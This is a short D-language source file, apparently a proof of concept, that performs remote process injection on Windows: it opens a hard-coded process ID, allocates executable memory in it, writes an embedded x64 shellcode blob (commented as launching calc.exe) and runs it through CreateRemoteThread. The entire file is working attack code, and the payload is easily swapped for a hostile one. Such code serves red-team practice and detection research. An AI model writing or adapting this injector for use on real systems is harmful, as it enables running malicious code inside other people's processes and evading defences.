// Possibly the first code written for process injection in D

import core.sys.windows.windows;
import std.conv;

void main()
{
    // Define the shellcode as byte array (pop calc.exe)
    string payload = 
        "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b" ~
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2" ~
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b" ~
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04" ~
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0" ~
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2" ~
        "\x48\x83\xec\x20\x41\xff\xd6";

    ubyte[] shellcode = cast(ubyte[])payload;
  
    // Get the handle of the target process
    auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, 4800);
    if (hProcess == null)
    {
        // Handle process opening failure
        return;
    }

    // Allocate memory in the target process
    LPVOID lpRemoteBuffer = VirtualAllocEx(hProcess, null, shellcode.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpRemoteBuffer == null)
    {
        // Handle memory allocation failure
        CloseHandle(hProcess);
        return;
    }

    // Write the shellcode to the allocated memory
    WriteProcessMemory(hProcess, lpRemoteBuffer, cast(LPCVOID)shellcode.ptr, shellcode.length, null);

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, null, 0, cast(LPTHREAD_START_ROUTINE)lpRemoteBuffer, null, 0, null);
    if (hThread == null)
    {
        // Handle thread creation failure
        VirtualFreeEx(hProcess, lpRemoteBuffer, shellcode.length, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up resources
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, lpRemoteBuffer, shellcode.length, MEM_RELEASE);
    CloseHandle(hProcess);
}
